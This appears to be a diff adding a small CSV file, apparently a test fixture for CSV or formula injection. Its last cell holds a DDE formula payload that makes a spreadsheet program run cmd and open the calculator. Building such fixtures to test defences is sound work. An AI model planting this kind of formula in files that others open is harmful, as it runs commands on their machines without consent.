@@ -1,0 +1,4 @@
+sep=,
+A,B
+C,D
+E,=cmd|' /C calc'!A0
